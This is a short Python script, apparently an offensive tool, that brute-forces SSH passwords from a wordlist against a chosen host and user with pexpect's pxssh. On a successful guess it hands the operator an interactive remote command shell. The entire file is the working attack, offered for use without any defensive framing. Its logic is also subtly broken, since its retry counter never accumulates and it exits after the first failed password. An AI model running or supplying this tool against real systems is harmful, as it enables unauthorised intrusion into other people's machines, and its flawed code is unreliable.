from pexpect import pxssh
import argparse
import time

def connect(host, user, password):
    fails = 0

    try:

        shell =pxssh.pxssh()
        shell.login(host, user, password)
        print('[-] Password Found:' + password)
        return  shell
    except Exception as e:
        if fails > 5:
            print('[-] Too many Socket Timeouts!')
            exit(0)

        elif 'read nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            return  connect(host, user, password)
        elif 'sychronize with original prompt' in str(e):
            time.sleep(1)
            return  connect(host, user, password)
        return  None

def Main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Specify Target Host")
    parser.add_argument("user", help="Specify Target User")
    parser.add_argument("file", help="Specify Target File")
    args = parser.parse_args()

    if args.host and args.user and args.file:
        with open(args.file, 'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print('Testing:' + str(password))
                con = connect(args.host, args.user, password)
                if con:
                    print("{SSH Connect, Issue Commands (q or Q) to quit}")
                    command = input(">")
                    while command != 'q'and command != 'Q':
                        con.sendline(command)
                        con.prompt()
                        print(con.before)
                        command = input(">")

                else:
                    print(parser.usage)
                    exit(0)

if __name__ == '__main__':
    Main()
